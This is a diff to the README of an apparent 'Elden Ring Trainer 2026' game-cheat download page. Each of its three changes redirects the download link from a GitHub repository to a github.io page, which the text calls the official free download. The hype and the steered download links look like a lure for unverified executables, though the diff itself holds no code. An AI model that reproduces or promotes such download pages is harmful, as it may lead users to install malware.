@@ -1,6 +1,6 @@
 # ⚔️ elden-ring-trainer-2026 - Dominate the Lands Between Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Elden%20Ring%20Trainer%202026-brightgreen?style=for-the-badge&logo=github)](https://github.com/Joelnegligible8840/elden-ring-trainer-2026)
+[![Download Now](https://img.shields.io/badge/Download-Elden%20Ring%20Trainer%202026-brightgreen?style=for-the-badge&logo=github)](https://joelnegligible8840.github.io)
 
 ---
 
@@ -28,7 +28,7 @@ Follow these three simple steps to start using the trainer today.
 
 ### Step 1: Download the Trainer
 
-Visit this link to download the application: **[https://github.com/Joelnegligible8840/elden-ring-trainer-2026](https://github.com/Joelnegligible8840/elden-ring-trainer-2026)**. This is the official download page, and it's completely free.
+Visit this link to download the application: **[https://joelnegligible8840.github.io](https://joelnegligible8840.github.io)**. This is the official download page, and it's completely free.
 
 ### Step 2: Launch the Trainer
 
@@ -131,7 +131,7 @@ The download package contains:
 
 ## 🔗 Direct Download Link
 
-**Visit this link to download the application:** [https://github.com/Joelnegligible8840/elden-ring-trainer-2026](https://github.com/Joelnegligible8840/elden-ring-trainer-2026)
+**Visit this link to download the application:** [https://joelnegligible8840.github.io](https://joelnegligible8840.github.io)
 
 ---
 
